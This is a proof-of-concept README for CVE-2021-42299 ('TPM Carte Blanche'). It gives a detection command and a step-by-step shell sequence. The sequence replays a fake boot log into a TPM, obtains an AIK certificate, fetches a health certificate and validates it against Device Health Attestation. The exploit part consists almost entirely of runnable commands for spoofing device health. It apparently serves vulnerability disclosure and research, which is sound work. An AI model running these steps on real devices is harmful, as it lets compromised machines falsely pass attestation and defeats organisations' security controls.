# CVE-2021-42299: TPM Carte Blanche

This Proof-Of-Concept demonstrates the exploitation of CVE-2021-42299.

## Technical details

Technical details about the exploit is available at [writeup.md](writeup.md).

## Detection
```shell
sudo bugtool
```

## Exploit proof-of-concept

```shell
# Extend the fake log
sudo dhatool --log=path/to/log/file --bank=sha256 replay
# Self test
sudo attest-tool --log=path/to/log/file self-test
# Get AIK cert
sudo akcli
# Fetch a health cert
sudo dhatool --log=path/to/log/file --bank=sha256 --aik=path/to/aik getcert
# Validate the health cert against DHA with the current time as a nonce
NONCE=$(echo "obase=16; $(date +%s%N)" | bc); echo ${NONCE}
# normally the MDM generates a nonce, asks the device for claims and then validates against DHA
sudo dhatool --cert=path/to/healthcert --bank=sha256 --aik=path/to/aik --nonce=$NONCE validate
```


## Credits

Chris Fenner (cfenn@)
